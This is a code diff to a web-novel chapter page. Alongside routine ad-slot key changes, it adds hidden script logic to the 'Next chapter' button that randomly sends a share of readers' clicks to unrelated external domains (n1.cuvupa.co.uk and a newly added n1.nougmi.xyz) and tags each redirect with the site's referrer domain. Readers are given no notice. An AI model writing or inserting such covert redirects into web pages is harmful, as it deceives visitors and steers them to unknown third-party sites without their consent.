@@ -2403,7 +2403,7 @@
                 <p>His fingers tapped nervously on the papers.</p>
                 <p>Sophia took the contract and skimmed through the terms.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>The conference room fell silent except for the rustling of pages.</p>
                 <p>&#34;Pen.&#34;</p>
                 <p>She extended her hand.</p>
@@ -2421,7 +2421,7 @@
                 <p>She slid the documents back and straightened her collar.</p>
                 <p>&#34;Music is just a hobby.&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>The words froze Lucas&#39;s expression mid-smile.</p>
                 <p>The conference door burst open.</p>
                 <p>&#34;Director, the next segment—&#34;</p>
@@ -2430,7 +2430,7 @@
                 <p>Lucas jolted to his feet.</p>
                 <p>&#34;Let me walk you out.&#34;</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>From conference room to elevator, the director chattered nonstop.</p>
                 <p>&#34;We&#39;ll arrange a private dressing room...&#34;</p>
                 <p>&#34;Any special requests for promotion...&#34;</p>
@@ -2443,7 +2443,7 @@
                 <p>&#34;Moving up in the world?&#34;</p>
                 <p>The voice made her fingers freeze mid-air.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
             </div>
             
             <div class="font-controls">
@@ -2565,7 +2565,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2581,8 +2581,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
